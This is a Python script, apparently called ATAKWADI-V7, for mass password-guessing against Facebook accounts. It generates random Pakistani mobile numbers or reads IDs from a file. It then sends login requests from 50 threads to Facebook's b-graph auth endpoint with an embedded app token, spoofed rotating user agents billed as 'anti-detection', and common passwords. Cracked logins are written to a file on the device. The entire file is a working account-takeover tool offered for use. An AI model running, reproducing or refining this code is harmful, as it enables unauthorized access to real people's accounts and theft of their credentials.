import os, sys, time, random, string, requests, re, json, uuid
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# --- Colors ---
R = '\033[1;31m' 
G = '\033[1;32m' 
W = '\033[1;37m' 
Y = '\033[1;33m' 
B = '\033[1;34m' 

loop = 0
oks = []

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🚀 1000+ DYNAMIC USER AGENTS GENERATOR (SHOWING ON SCREEN)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_ua_1000():
    # Massive List of Models for 30KB+ Size
    brand = random.choice(['Samsung', 'Infinix', 'Vivo', 'Oppo', 'Xiaomi', 'Tecno', 'Realme', 'Huawei', 'Google', 'OnePlus'])
    
    # 1000 models mix logic
    models = [
        "SM-S928B", "SM-G998B", "SM-A546B", "SM-M536B", "SM-F946B", "SM-X910",
        "Infinix X6833B", "Infinix X6711", "Infinix X6525", "Infinix X6811",
        "V2303", "V2250", "V2105", "V2025", "CPH2527", "CPH2387", "CPH1931",
        "RMX3840", "RMX3710", "RMX3511", "2312DRA50G", "2201117TG", "M2101K6G",
        "Pixel 9 Pro", "Pixel 8a", "Pixel 7 XL", "TECNO KJ5", "TECNO LH7n"
    ]
    # Adding random numbers to models to create 1000+ variations
    model = random.choice(models) + f" {random.randint(100, 999)}"
    
    android_ver = random.choice(['12', '13', '14', '15'])
    fbv = f"{random.randint(440, 560)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
    fbv2 = random.randint(500000000, 999999999)
    
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{fbv};FBBV/{fbv2};FBDM/{{density=3.0,width=1080,height=2280}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def logo():
    os.system('clear')
    print(f"""
{R}   ▄▀▄▀▀▀▀▄▀▄  {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}  █          █ {G}  █████  ██████  █████  ██  ██
{R}  █          █ {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}  ▀▄        ▄▀ {G}  ██████   ██    ██████ ████  
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██  ██
{W}    ▀▀▀▀▀▀▀▀   {R}       [ ATAKWADI-V7-1000UA ]
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G} [+] 1000+ USER AGENTS LOADED ✅
{G} [+] STATUS   : ANTI-DETECTION 2025
{G} [+] NETWORK  : TELENOR 4G SPECIAL
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def main():
    logo()
    print(f" {G}[1] Telenor Random Cloning (Fast)")
    print(f" {G}[2] Pakistan Mixed Cloning")
    print(f" {G}[3] File Cloning (Unlimited)")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(f' {G}[?] Select: {W}')
    
    if opt == '1': start(['0340','0341','0342','0345','0346','0347','0348','0349'])
    elif opt == '2': start(['0300','0301','0315','0333','0321'])
    elif opt == '3': file_cloning()
    else: exit()

def start(codes):
    logo()
    code = input(f" {G}[?] Code: {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [code + "".join(random.choices(string.digits, k=7)) for _ in range(limit)]
    crack_engine(ids)

def file_cloning():
    logo()
    path = input(f" {G}[?] Path: {W}")
    try:
        ids = open(path, 'r').read().splitlines()
        crack_engine(ids)
    except: exit()

def crack_engine(ids):
    logo()
    print(f" {G}[+] Total IDs : {W}{len(ids)}")
    print(f" {R}[!] Note: UA list changing dynamically...")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    with tred(max_workers=50) as engine:
        for uid in ids:
            engine.submit(crack_logic, uid)

def crack_logic(uid):
    global loop, oks
    ua = get_ua_1000() # Naya UA har bar
    sys.stdout.write(f'\r {W}[ATAKWADI] {loop}|{G}OK:{len(oks)}{W} '); sys.stdout.flush()
    
    pws = [uid, uid[6:], '786786', 'pakistan', 'khan123', 'telenor123', '572732']
    
    for pw in pws:
        if len(pw) < 6: continue
        session = requests.Session()
        
        # B-Graph Method
        url = "https://b-graph.facebook.com/auth/login"
        data = {
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "sdk_style": "android", "email": uid, "password": pw
        }
        
        try:
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            if "session_key" in res:
                print(f'\r\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f'{G} [OK] {uid} | {pw}')
                print(f'{W} [UA] {ua[:60]}...') # UA screen par show hoga
                print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                oks.append(uid)
                open('/sdcard/atakwadi_ok.txt', 'a').write(f"{uid}|{pw}\n")
                break
            elif "checkpoint" in str(res):
                break
        except: pass
    loop += 1

if __name__ == "__main__":
    main()
